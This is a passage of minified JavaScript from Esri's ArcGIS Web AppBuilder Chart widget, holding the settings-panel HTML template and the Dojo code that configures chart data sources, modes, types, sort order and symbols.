// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Chart/setting/SingleChartSetting.html":'\x3cdiv\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"tabDiv"\x3e\r\n\t\t\x3cdiv data-dojo-attach-point\x3d"settingsTabNode"\x3e\r\n\t\t\t\x3c!--general settings--\x3e\r\n\t\t\t\x3cdiv class\x3d"part-setting-title"\x3e${nls.generalSettingsTip}\x3c/div\x3e\r\n\t\t\t\x3ctable class\x3d"part-setting-table gereral-table" cellpadding\x3d"0" cellspacing\x3d"0"\x3e\r\n\t\t\t\t\x3ccolgroup\x3e\r\n\t\t\t\t\t\x3ccol width\x3d"10px;"\x3e\x3c/col\x3e\r\n\t\t\t\t\t\x3ccol width\x3d"116px" align\x3d"left"\x3e\x3c/col\x3e\r\n\t\t\t\t\t\x3ccol width\x3d"auto"\x3e\x3c/col\x3e\r\n\t\t\t\t\x3c/colgroup\x3e\r\n\t\t\t\t\x3ctbody\x3e\r\n\t\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\t\x3ctd\x3e\x3c/td\x3e\r\n\t\t\t\t\t\t\x3ctd class\x3d"text-middle" style\x3d"vertical-align: top;"\x3e\r\n\t\t\t\t\t\t\t\x3cspan style\x3d"line-height:30px;" title\x3d"${nls.dataSource}"\x3e${nls.dataSource}\x3c/span\x3e\r\n\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\t\x3cdiv style\x3d"position:relative;overflow:hidden;width:100%;height:30px;"\x3e\r\n\t\t\t\t\t\t\t\t\x3cdiv class\x3d"url-text-box" data-dojo-attach-point\x3d"urlTextBox"\r\n\t\t\t\t\t\t\t\tdata-dojo-type\x3d"dijit/form/ValidationTextBox"\r\n\t\t\t\t\t\t\t\tdata-dojo-props\x3d\'required:true,trim:true,disabled:true\'\r\n\t\t\t\t\t\t\t\tstyle\x3d"display:inline-block;width:380px;min-width:380px;height:100%;"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\t\t\x3cdiv class\x3d"filter-icon" title\x3d"${nls.addFilterTip}" data-dojo-attach-point\x3d"filterIcon"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\t\t\x3cdiv class\x3d"jimu-btn btn-data-source jimu-float-trailing" data-dojo-attach-point\x3d"btnSetSource" data-dojo-attach-event\x3d"onclick:_onBtnSetClicked" title\x3d"${nls.set}"\x3e${nls.set}\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\t\x3ctd\x3e\x3c/td\x3e\r\n\t\t\t\t\t\t\x3ctd class\x3d"text-middle"\x3e\r\n\t\t\t\t\t\t\t\x3cspan title\x3d"${nls.chartTitle}"\x3e${nls.chartTitle}\x3c/span\x3e\r\n\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"chartNameTextBox"\r\n\t\t\t\t\t\t\tdata-dojo-type\x3d"dijit/form/ValidationTextBox"\r\n\t\t\t\t\t\t\tdata-dojo-props\x3d\'required:true,trim:true\'\r\n\t\t\t\t\t\t\tdata-dojo-attach-event\x3d"change:_onChartNameChanged,blur:_onChartNameBlurred"\r\n\t\t\t\t\t\t\tstyle\x3d"width:100%;"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\t\x3ctd\x3e\x3c/td\x3e\r\n\t\t\t\t\t\t\x3ctd class\x3d"text-middle"\x3e\r\n\t\t\t\t\t\t\t\x3cspan title\x3d"${nls.description}"\x3e${nls.description}\x3c/span\x3e\r\n\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\t\x3ctextarea data-dojo-attach-point\x3d"descriptionTA"\r\n\t\t\t\t\t\t\tdata-dojo-attach-event\x3d"blur:_onDescriptionBlurred"\r\n\t\t\t\t\t\t\tstyle\x3d"width:100%;height:34px;resize:none;"\x3e\x3c/textarea\x3e\r\n\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3c/tbody\x3e\r\n\t\t\t\x3c/table\x3e\r\n\r\n\r\n\t\t\t\x3c!--chart mode setting--\x3e\r\n\t\t\t\x3cdiv class\x3d"part-setting-title"\x3e${nls.chartModeSettingTip}\x3c/div\x3e\r\n\t\t\t\x3ctable class\x3d"part-setting-table chart-mode-table" cellpadding\x3d"0" cellspacing\x3d"0"\x3e\r\n\t\t\t\t\x3ccolgroup\x3e\r\n\t\t\t\t\t\x3ccol width\x3d"10px"\x3e\x3c/col\x3e\r\n\t\t\t\t\t\x3ccol width\x3d"116px" align\x3d"left"\x3e\x3c/col\x3e\r\n\t\t\t\t\t\x3ccol width\x3d"auto"\x3e\x3c/col\x3e\r\n\t\t\t\t\x3c/colgroup\x3e\r\n\t\t\t\t\x3ctbody\x3e\r\n\t\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\t\x3ctd\x3e\x3c/td\x3e\r\n\t\t\t\t\t\t\x3ctd class\x3d"text-middle"\x3e\r\n\t\t\t\t\t\t\t\x3cspan title\x3d"${nls.chartingMode}"\x3e${nls.chartingMode}\x3c/span\x3e\r\n\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\t\x3cselect data-dojo-attach-point\x3d"chartModeSelect" data-dojo-type\x3d"dijit/form/Select" data-dojo-attach-event\x3d"change:_onChartModeChanged" style\x3d"width:100%;"\x3e\r\n\t\t\t\t\t\t\t\x3c/select\x3e\r\n\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3c/tbody\x3e\r\n\t\t\t\x3c/table\x3e\r\n\r\n\r\n\t\t\t\x3c!--detail setting--\x3e\r\n\t\t\t\x3cdiv class\x3d"part-setting-title" style\x3d"margin-bottom:15px;"\x3e${nls.detailsSettingTip}\x3c/div\x3e\r\n\t\t\t\x3ctable data-dojo-attach-point\x3d"detailsTable" class\x3d"part-setting-table details-table" cellpadding\x3d"0" cellspacing\x3d"0"\x3e\r\n\t\t\t  \x3ccolgroup\x3e\r\n\t\t\t\t\x3ccol width\x3d"10px"\x3e\x3c/col\x3e\r\n\t\t\t\t\x3ccol width\x3d"116px" align\x3d"left"\x3e\x3c/col\x3e\r\n\t\t\t\t\x3ccol width\x3d"auto"\x3e\x3c/col\x3e\r\n\t\t\t  \x3c/colgroup\x3e\r\n\t\t\t  \x3ctbody calss\x3d"details-tbody"\x3e\r\n\t\t\t   \x3ctr class\x3d"detail-tr category-tr count-tr"\x3e\r\n\t\t\t\t  \t\x3ctd\x3e\x3c/td\x3e\r\n\t\t\t\t  \t\x3ctd class\x3d"text-middle"\x3e\r\n\t\t\t\t  \t\t\x3cspan title\x3d"${nls.categoryField}"\x3e${nls.categoryField}\x3c/span\x3e\r\n\t\t\t\t  \t\x3c/td\x3e\r\n\t\t\t\t  \t\x3ctd\x3e\r\n\t\t\t\t  \t\t\x3cdiv style\x3d"position:relative;overflow:hidden;width:100%;height:30px;"\x3e\r\n\t\t\t\t  \t\t\t\x3cselect data-dojo-attach-point\x3d"categoryFieldSelect" data-dojo-type\x3d"dijit/form/Select" style\x3d"width:485px;height:100%;"\x3e\r\n\t\t\t\t  \t\t\t\x3c/select\x3e\r\n\t\t\t\t  \t\t\t\x3cdiv class\x3d"sort-icon" title\x3d"${nls.sortOrder}" data-dojo-attach-point\x3d"categorySortOrderIcon"\x3e\x3c/div\x3e\r\n\t\t\t\t  \t\t\x3c/div\x3e\r\n\t\t\t\t  \t\x3c/td\x3e\r\n\t\t\t\t \x3c/tr\x3e\r\n\r\n\t\t\t\t \x3ctr class\x3d"detail-tr feature-tr category-tr field-tr"\x3e\r\n\t\t\t\t  \t\x3ctd\x3e\x3c/td\x3e\r\n\t\t\t\t  \t\x3ctd class\x3d"text-middle" style\x3d"vertical-align:top;"\x3e\r\n\t\t\t\t  \t\t\x3cspan style\x3d"line-height:30px;" title\x3d"${nls.valueFields}"\x3e${nls.valueFields}\x3c/span\x3e\r\n\t\t\t\t  \t\x3c/td\x3e\r\n\t\t\t\t  \t\x3ctd\x3e\r\n\t\t\t\t  \t\t\x3cdiv data-dojo-attach-point\x3d"dataFieldsDiv"\x3e\x3c/div\x3e\r\n\t\t\t\t  \t\x3c/td\x3e\r\n\t\t\t\t \x3c/tr\x3e\r\n\r\n\t\t\t\t \x3ctr class\x3d"detail-tr feature-tr"\x3e\r\n\t\t\t\t \t\x3ctd\x3e\x3c/td\x3e\r\n\t\t\t\t \t\x3ctd class\x3d"text-middle"\x3e\r\n\t\t\t\t \t\t\x3cspan title\x3d"${nls.axisLabel}"\x3e${nls.axisLabel}\x3c/span\x3e\r\n\t\t\t\t \t\x3c/td\x3e\r\n\t\t\t\t \t\x3ctd\x3e\r\n\t\t\t\t \t\t\x3cdiv style\x3d"position:relative;overflow:hidden;width:100%;height:30px;"\x3e\r\n\t\t\t\t  \t\t\t\x3cselect data-dojo-attach-point\x3d"featureAxisLabelSelect" data-dojo-type\x3d"dijit/form/Select" style\x3d"width:485px;height:100%;"\x3e\r\n\t\t\t\t  \t\t\t\x3c/select\x3e\r\n\t\t\t\t  \t\t\t\x3cdiv class\x3d"sort-icon" title\x3d"${nls.sortOrder}" data-dojo-attach-point\x3d"featureSortOrderIcon"\x3e\x3c/div\x3e\r\n\t\t\t\t  \t\t\x3c/div\x3e\r\n\t\t\t\t \t\x3c/td\x3e\r\n\t\t\t\t \x3c/tr\x3e\r\n\r\n\t\t\t\t \x3ctr class\x3d"detail-tr category-tr"\x3e\r\n\t\t\t\t  \t\x3ctd\x3e\x3c/td\x3e\r\n\t\t\t\t  \t\x3ctd class\x3d"text-middle"\x3e\r\n\t\t\t\t  \t\t\x3cspan title\x3d"${nls.operation}"\x3e${nls.operation}\x3c/span\x3e\r\n\t\t\t\t  \t\x3c/td\x3e\r\n\t\t\t\t  \t\x3ctd\x3e\r\n\t\t\t\t  \t\t\x3cselect data-dojo-attach-point\x3d"categoryOperationSelect" data-dojo-type\x3d"dijit/form/Select" style\x3d"width:100%;"\x3e\r\n\t\t\t\t  \t\t\t\x3coption value\x3d"sum"\x3e${nls.sumOption}\x3c/option\x3e\r\n\t\t\t\t  \t\t\t\x3coption value\x3d"average"\x3e${nls.averageOption}\x3c/option\x3e\r\n\t\t\t\t  \t\t\t\x3coption value\x3d"min"\x3e${nls.minOption}\x3c/option\x3e\r\n\t\t\t\t  \t\t\t\x3coption value\x3d"max"\x3e${nls.maxOption}\x3c/option\x3e\r\n\t\t\t\t  \t\t\x3c/select\x3e\r\n\t\t\t\t  \t\x3c/td\x3e\r\n\t\t\t\t \x3c/tr\x3e\r\n\r\n\t\t\t\t \x3ctr class\x3d"detail-tr field-tr"\x3e\r\n\t\t\t\t  \t\x3ctd\x3e\x3c/td\x3e\r\n\t\t\t\t  \t\x3ctd class\x3d"text-middle"\x3e\r\n\t\t\t\t  \t\t\x3cspan title\x3d"${nls.operation}"\x3e${nls.operation}\x3c/span\x3e\r\n\t\t\t\t  \t\x3c/td\x3e\r\n\t\t\t\t  \t\x3ctd\x3e\r\n\t\t\t\t  \t\t\x3cselect data-dojo-attach-point\x3d"fieldOperationSelect" data-dojo-type\x3d"dijit/form/Select" style\x3d"width:100%;"\x3e\r\n\t\t\t\t  \t\t\t\x3coption value\x3d"sum"\x3e${nls.sumOption}\x3c/option\x3e\r\n\t\t\t\t  \t\t\t\x3coption value\x3d"average"\x3e${nls.averageOption}\x3c/option\x3e\r\n\t\t\t\t  \t\t\t\x3coption value\x3d"min"\x3e${nls.minOption}\x3c/option\x3e\r\n\t\t\t\t  \t\t\t\x3coption value\x3d"max"\x3e${nls.maxOption}\x3c/option\x3e\r\n\t\t\t\t  \t\t\x3c/select\x3e\r\n\t\t\t\t  \t\x3c/td\x3e\r\n\t\t\t\t \x3c/tr\x3e\r\n\r\n\t\t\t\t \x3ctr class\x3d"detail-tr feature-tr category-tr count-tr field-tr chart-types-tr"\x3e\r\n\t\t\t\t  \t\x3ctd\x3e\x3c/td\x3e\r\n\t\t\t\t  \t\x3ctd class\x3d"text-middle"\x3e\r\n\t\t\t\t  \t\t\x3cspan title\x3d"${nls.chartType}"\x3e${nls.chartType}\x3c/span\x3e\r\n\t\t\t\t  \t\x3c/td\x3e\r\n\t\t\t\t  \t\x3ctd class\x3d"charts-td"\x3e\r\n\t\t\t\t  \t\t\x3cdiv class\x3d"jimu-trailing-margin1"\x3e\r\n\t\t\t\t  \t\t\t\x3cinput type\x3d"checkbox" data-dojo-attach-point\x3d"columnCbx" /\x3e\r\n\t\t\t\t  \t\t\t\x3clabel data-dojo-attach-point\x3d"columnLabel"\x3e${nls.column}\x3c/label\x3e\r\n\t\t\t\t  \t\t\t\x3cdiv class\x3d"edit-div" data-dojo-attach-point\x3d"columnEdit"\x3e\x3c/div\x3e\r\n\t\t\t\t  \t\t\x3c/div\x3e\r\n\r\n\t\t\t\t  \t\t\x3cdiv class\x3d"jimu-trailing-margin1"\x3e\r\n\t\t\t\t  \t\t\t\x3cinput type\x3d"checkbox" data-dojo-attach-point\x3d"pieCbx" /\x3e\r\n\t\t\t\t  \t\t\t\x3clabel data-dojo-attach-point\x3d"pieLabel"\x3e${nls.pie}\x3c/label\x3e\r\n\t\t\t\t  \t\t\t\x3cdiv class\x3d"edit-div" data-dojo-attach-point\x3d"pieEdit"\x3e\x3c/div\x3e\r\n\t\t\t\t  \t\t\x3c/div\x3e\r\n\r\n\t\t\t\t  \t\t\x3cdiv class\x3d"jimu-trailing-margin1"\x3e\r\n\t\t\t\t  \t\t\t\x3cinput type\x3d"checkbox" data-dojo-attach-point\x3d"barCbx" /\x3e\r\n\t\t\t\t  \t\t\t\x3clabel data-dojo-attach-point\x3d"barLabel"\x3e${nls.bar}\x3c/label\x3e\r\n\t\t\t\t  \t\t\t\x3cdiv class\x3d"edit-div" data-dojo-attach-point\x3d"barEdit"\x3e\x3c/div\x3e\r\n\t\t\t\t  \t\t\x3c/div\x3e\r\n\r\n\t\t\t\t  \t\t\x3cdiv\x3e\r\n\t\t\t\t  \t\t\t\x3cinput type\x3d"checkbox" data-dojo-attach-point\x3d"lineCbx" /\x3e\r\n\t\t\t\t  \t\t\t\x3clabel data-dojo-attach-point\x3d"lineLabel"\x3e${nls.line}\x3c/label\x3e\r\n\t\t\t\t  \t\t\t\x3cdiv class\x3d"edit-div" data-dojo-attach-point\x3d"lineEdit"\x3e\x3c/div\x3e\r\n\t\t\t\t  \t\t\x3c/div\x3e\r\n\t\t\t\t  \t\x3c/td\x3e\r\n\t\t\t\t \x3c/tr\x3e\r\n\t\t\t  \x3c/tbody\x3e\r\n\t\t\t\x3c/table\x3e\r\n\r\n\r\n\t\t\t\x3c!--symbol setting--\x3e\r\n\t\t\t\x3cdiv class\x3d"part-setting-title"\x3e${nls.symbolSettingTip}\x3c/div\x3e\r\n\t\t\t\x3cdiv style\x3d"margin-left:10px;"\x3e\r\n\t\t\t\t\x3cdiv style\x3d"margin-top:20px;overflow:hidden;"\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"jimu-float-leading symbol-tip"\x3e${nls.setSymbol}:\x3c/div\x3e\r\n\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"symbolPicker" data-dojo-type\x3d"jimu/dijit/SymbolPicker"\x3e\x3c/div\x3e\r\n\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\x3cdiv style\x3d"margin-top:30px;overflow:hidden;padding-bottom:10px;"\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"jimu-float-leading hightlight-tip"\x3e${nls.setHighLightColor}:\x3c/div\x3e\r\n\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"colorPicker" data-dojo-type\x3d"jimu/dijit/ColorPicker" data-dojo-props\x3d\'color:"${_highLightColor}"\' style\x3d"display:inline-block;width:25px;height:25px;"\x3e\x3c/div\x3e\r\n\t\t\t\t\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv data-dojo-attach-point\x3d"previewTabNode"\x3e\r\n\t\t\t\x3cdiv data-dojo-attach-point\x3d"previewDiv" class\x3d"preview-div"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"shelter" data-dojo-type\x3d"jimu/dijit/LoadingShelter" data-dojo-props\x3d"hidden:true"\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dojo/_base/query dojo/_base/Color dojo/on dojo/Evented dojo/Deferred dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./SingleChartSetting.html dijit/TooltipDialog dijit/popup jimu/utils jimu/dijit/TabContainer3 jimu/dijit/Filter jimu/dijit/_FeaturelayerSourcePopup jimu/dijit/Message jimu/dijit/StatisticsChart ./DataFields jimu/dijit/_StatisticsChartSettings esri/request esri/tasks/query esri/tasks/QueryTask esri/symbols/jsonUtils dijit/Tooltip dijit/form/Select dijit/form/ValidationTextBox jimu/dijit/SymbolPicker jimu/dijit/SimpleTable jimu/dijit/LoadingShelter".split(" "),
function(u,d,l,e,m,q,k,v,w,x,y,z,A,p,r,h,B,C,D,E,F,G,n,H,I,t,J){return u([x,y,z,v],{baseClass:"jimu-widget-singlechart-setting",templateString:A,mediaSelector:null,config:null,map:null,nls:null,tr:null,folderUrl:"",appConfig:null,_webMapLayerId:null,maxPreviewFeaturesCount:50,_layerDefinition:null,_highLightColor:"#ff0000",_oidFieldType:"esriFieldTypeOID",_stringFieldType:"esriFieldTypeString",_numberFieldTypes:["esriFieldTypeSmallInteger","esriFieldTypeInteger","esriFieldTypeSingle","esriFieldTypeDouble"],
_dateFieldType:"esriFieldTypeDate",postCreate:function(){this.inherited(arguments);this._initSelf()},destroy:function(){this.tr=null;delete this.tr;this._hideAllTooltipDialogs();this._destroyTooltipDialog("filterTooltipDialog");this._destroyTooltipDialog("sortOrderTooltipDialog");this._destroyTooltipDialog("columnTTD");this._destroyTooltipDialog("barTTD");this._destroyTooltipDialog("lineTTD");this._destroyTooltipDialog("pieTTD");this.inherited(arguments)},_destroyTooltipDialog:function(a){var c=this[a];
c&&(this._hideTooltipDialog(c),c.destroy());c=null;this[a]=null},_hideAllTooltipDialogs:function(){this._hideTooltipDialog(this.filterTooltipDialog);this._hideTooltipDialog(this.sortOrderTooltipDialog);this._hideAllParamsTooltipDialogs()},_hideAllParamsTooltipDialogs:function(){this.columnTTD&&this._hideTooltipDialog(this.columnTTD);this.barTTD&&this._hideTooltipDialog(this.barTTD);this.lineTTD&&this._hideTooltipDialog(this.lineTTD);this.pieTTD&&this._hideTooltipDialog(this.pieTTD)},_hideTooltipDialog:function(a){a&&
(r.close(a),a.isOpendNow=!1)},_showTooltipDialog:function(a,c,b){a&&(c={popup:a,around:c},b&&(c.orient=b),r.open(c),a.isOpendNow=!0)},startup:function(){this._started||this.inherited(arguments);this._started=!0},_updateUrlTextBoxLength:function(){try{var a=e.getMarginBox(this.btnSetSource),c=e.getContentBox(this.descriptionTA);e.setStyle(this.urlTextBox.domNode,"width",Math.max(c.w-a.w-10,380)+"px")}catch(b){console.error(b)}},setConfig:function(a){if(this._isObject(a)){this.config=a;var c=a.url||
"";c&&"string"===typeof c&&(this._layerDefinition&&this._layerDefinition.url===c?this._resetByConfig(this.config,this._layerDefinition):(this._layerDefinition=null,this.showBigShelter(),H({url:c,hanleAs:"json",content:{f:"json"},callbackParamName:"callback"}).then(d.hitch(this,function(a){this.domNode&&(this.hideBigShelter(),this._layerDefinition=a,this._layerDefinition.url=c,this._resetByConfig(this.config,this._layerDefinition))}),d.hitch(this,function(a){console.error(a);this.domNode&&this.hideBigShelter()}))))}},
getConfig:function(a){var c={url:"",filter:"",description:"",symbol:"",webMapLayerId:this._webMapLayerId,mode:"",name:"",highLightColor:"",types:[]};c.url=this.urlTextBox.get("value");var b=this.filter.toJson();if(!b||!b.expr)return a&&(this.tab.viewStack.getSelectedLabel()!==this.nls.preview&&this._showTooltipDialog(this.filterTooltipDialog,this.urlTextBox.domNode),this._showMessage(this.nls.setFilterTip)),!1;c.filter=b;b=this.chartNameTextBox.get("value");b=h.stripHTML(b);if(!b)return a&&this._showMessage(this.nls.setChartTitleTip),
!1;c.name=b;c.description=h.stripHTML(this.descriptionTA.value);c.mode=this.chartModeSelect.get("value");this.columnCbx.checked&&c.types.push({type:"column",display:this.columnParameters.getConfig()});this.pieCbx.checked&&c.types.push({type:"pie",display:this.pieParameters.getConfig()});this.barCbx.checked&&c.types.push({type:"bar",display:this.barParameters.getConfig()});this.lineCbx.checked&&c.types.push({type:"line",display:this.lineParameters.getConfig()});if(0===c.types.length&&a)return this._showMessage(this.nls.setChartTypeTip),
!1;if("feature"===c.mode){b={labelField:"",valueFields:[],sortOrder:{}};b.labelField=this.featureAxisLabelSelect.get("value");var g=this.valueFields.getSelectedFieldNames();if(0===g.length)return a&&this._showMessage(this.nls.setDataFieldTip),!1;b.valueFields=g;b.sortOrder=this._getSortOrder();c=d.mixin(c,b)}else if("category"===c.mode){b={categoryField:"",operation:"",valueFields:[],sortOrder:{}};b.categoryField=this.categoryFieldSelect.get("value");b.operation=this.categoryOperationSelect.get("value");
g=this.valueFields.getSelectedFieldNames();if(0===g.length)return a&&this._showMessage(this.nls.setDataFieldTip),!1;b.valueFields=g;b.sortOrder=this._getSortOrder();c=d.mixin(c,b)}else if("count"===c.mode)a={categoryField:"",sortOrder:{}},a.categoryField=this.categoryFieldSelect.get("value"),a.sortOrder=this._getSortOrder(),c=d.mixin(c,a);else if("field"===c.mode){b={operation:"",valueFields:[]};b.operation=this.fieldOperationSelect.get("value");g=this.valueFields.getSelectedFieldNames();if(0===g.length)return a&&
this._showMessage(this.nls.setDataFieldTip),!1;b.valueFields=g;c=d.mixin(c,b)}this.config=d.clone(c);if(a=this.symbolPicker.getSymbol())c.symbol=a.toJson();else return!1;a=this.colorPicker.getColor();c.highLightColor=a.toHex();this.tr._layerDefinition=this._layerDefinition;return d.clone(c)},showBigShelter:function(){this.emit("show-shelter")},_getSortOrder:function(){var a={isLabelAxis:!0};a.isAsc=this.ascRadio.checked;return a},hideBigShelter:function(){this.emit("hide-shelter")},_showMessage:function(a){new E({message:a})},
_isObject:function(a){return a&&"object"===typeof a},_initSelf:function(){this._initTabs();this._initChartTypes();this._initFilter();this._initSortOrder();this._initDataFields();this._initPreview();this._onChartModeChanged()},_initTabs:function(){var a={title:this.nls.preview,content:this.previewTabNode};this.tab=new B({tabs:[{title:this.nls.settings,content:this.settingsTabNode},a]});this.tab.placeAt(this.tabDiv);this.own(k(this.tab,"tabChanged",d.hitch(this,function(c){this._hideAllTooltipDialogs();
c===a.title&&this._updatePreview()})))},_initFilter:function(){var a=e.toDom('\x3cdiv\x3e\x3cdiv class\x3d"filter-div"\x3e\x3c/div\x3e\x3cdiv class\x3d"operations" style\x3d"overflow:hidden;"\x3e\x3cdiv class\x3d"jimu-btn  jimu-float-trailing btn-cancel"\x3e\x3c/div\x3e\x3cdiv class\x3d"jimu-btn  jimu-float-trailing btn-ok"\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e'),c=m(".filter-div",a)[0],b=m(".btn-ok",a)[0],g=m(".btn-cancel",a)[0];b.innerHTML=this.nls.ok;g.innerHTML=this.nls.close;window.isRTL?b.style.marginLeft=
"20px":b.style.marginRight="20px";this.filterTooltipDialog=new p({content:a});this.filter=new C({autoSwitchMode:!1});this.filter.allExpsBox.style.maxHeight="300px";this.filter.allExpsBox.style.overflowY="auto";this.filter.placeAt(c);this.filter.startup();this.own(k(b,"click",d.hitch(this,function(){this.filter.toJson()&&this._hideTooltipDialog(this.filterTooltipDialog)})));this.own(k(g,"click",d.hitch(this,function(){this._hideTooltipDialog(this.filterTooltipDialog)})));this.own(k(this.filterIcon,
"click",d.hitch(this,function(){this.filterTooltipDialog.isOpendNow?this._hideTooltipDialog(this.filterTooltipDialog):this._showTooltipDialog(this.filterTooltipDialog,this.urlTextBox.domNode)})))},_initSortOrder:function(){var a='\x3cdiv\x3e\x3cdiv class\x3d"asc-div"\x3e\x3cinput type\x3d"radio" class\x3d"asc-radio jimu-radio-btn" checked /\x3e\x3cspan class\x3d"asc-span" style\x3d"margin-left:10px;"\x3e'+this.nls.ascending+'\x3c/span\x3e\x3c/div\x3e\x3cdiv class\x3d"des" style\x3d"margin-top:10px;"\x3e\x3cinput type\x3d"radio" class\x3d"des-radio jimu-radio-btn" /\x3e\x3cspan class\x3d"des-span" style\x3d"margin-left:10px;"\x3e'+
this.nls.descending+"\x3c/span\x3e\x3c/div\x3e\x3c/div\x3e",c="chart_"+h.getRandomString(),a=e.toDom(a);this.ascRadio=m(".asc-radio",a)[0];this.desRadio=m(".des-radio",a)[0];this.ascRadio.name=c;this.desRadio.name=c;this.sortOrderTooltipDialog=new p({content:a});this.own(k(document.body,"click",d.hitch(this,function(a){var c=!!this.sortOrderTooltipDialog.isOpendNow;this._hideTooltipDialog(this.sortOrderTooltipDialog);var b=this.chartModeSelect.get("value"),d=null;"feature"===b?d=this.featureSortOrderIcon:
"category"===b&&(d=this.categorySortOrderIcon);b=a.target||a.srcElement;d&&(b===d?c?this._hideTooltipDialog(this.sortOrderTooltipDialog):this._showTooltipDialog(this.sortOrderTooltipDialog,d,["after-centered","below"]):(a=b===this.sortOrderTooltipDialog.domNode,b=e.isDescendant(b,this.sortOrderTooltipDialog.domNode),a||b?c?this._showTooltipDialog(this.sortOrderTooltipDialog,d,["after-centered","below"]):this._hideTooltipDialog(this.sortOrderTooltipDialog):this._hideTooltipDialog(this.sortOrderTooltipDialog)))})))},
_initDataFields:function(){this.valueFields=new G({nls:this.nls});this.valueFields.placeAt(this.dataFieldsDiv);this.valueFields.startup();this.own(k(this.valueFields,"change",d.hitch(this,function(){this._updateChartTypes();this._updateParametersDijit()})))},_updateParametersDijit:function(){var a=this.chartModeSelect.get("value");"feature"===a||"category"===a?1===this.valueFields.getSelectedFieldNames().length?(this.columnParameters.showSingleColor(),this.barParameters.showSingleColor(),this.lineParameters.showSingleColor()):
(this.columnParameters.showMultiColor(),this.barParameters.showMultiColor(),this.lineParameters.showMultiColor()):(this.columnParameters.showSingleColor(),this.barParameters.showSingleColor(),this.lineParameters.showSingleColor())},_updateChartTypes:function(){this.pieCbx.disabled=!1;var a=this.chartModeSelect.get("value");("feature"===a||"category"===a)&&1<this.valueFields.getSelectedFieldNames().length&&(this.pieCbx.checked=!1,this.pieCbx.disabled=!0);this.pieCbx.disabled?e.addClass(this.pieLabel,
"gray"):e.removeClass(this.pieLabel,"gray")},_initChartTypes:function(){var a=this.folderUrl+"common/images";h.combineRadioCheckBoxWithLabel(this.columnCbx,this.columnLabel);this.columnParameters=new n({type:"column",imagesUrl:a,isInWidget:!1,singleColor:!1,nls:this.nls,config:null});this.columnTTD=this._createParametersDialog(this.columnCbx,this.columnEdit,this.columnParameters);h.combineRadioCheckBoxWithLabel(this.pieCbx,this.pieLabel);this.pieParameters=new n({type:"pie",imagesUrl:a,isInWidget:!1,
singleColor:!1,nls:this.nls,config:null});this.pieTTD=this._createParametersDialog(this.pieCbx,this.pieEdit,this.pieParameters);h.combineRadioCheckBoxWithLabel(this.barCbx,this.barLabel);this.barParameters=new n({type:"bar",imagesUrl:a,isInWidget:!1,singleColor:!1,nls:this.nls,config:null});this.barTTD=this._createParametersDialog(this.barCbx,this.barEdit,this.barParameters);h.combineRadioCheckBoxWithLabel(this.lineCbx,this.lineLabel);this.lineParameters=new n({type:"line",imagesUrl:a,isInWidget:!1,
singleColor:!1,nls:this.nls,config:null});this.lineTTD=this._createParametersDialog(this.lineCbx,this.lineEdit,this.lineParameters);this.own(k(document.body,"click",d.hitch(this,function(a){var b=a.target||a.srcElement;this._unselectEditDivs();var c=null,d=null,f=a=null,c=b===this.columnEdit||b===this.pieEdit||b===this.barEdit||b===this.lineEdit;b===this.columnCbx||b===this.pieCbx||b===this.barCbx||b===this.lineCbx?(d=b,d===this.columnCbx?(a=this.columnEdit,f=this.columnTTD):d===this.pieCbx?(a=this.pieEdit,
f=this.pieTTD):d===this.barCbx?(a=this.barEdit,f=this.barTTD):d===this.lineCbx&&(a=this.lineEdit,f=this.lineTTD),c=!!f.isOpendNow,this._hideAllParamsTooltipDialogs(),d.checked?(this._showEditDiv(a),e.addClass(a,"selected"),this._showTooltipDialog(f,a)):(this._hideTooltipDialog(f),this._hideEditDiv(a))):c?(a=b,a===this.columnEdit?f=this.columnTTD:a===this.pieEdit?f=this.pieTTD:a===this.barEdit?f=this.barTTD:a===this.lineEdit&&(f=this.lineTTD),c=!!f.isOpendNow,this._hideAllParamsTooltipDialogs(),c?
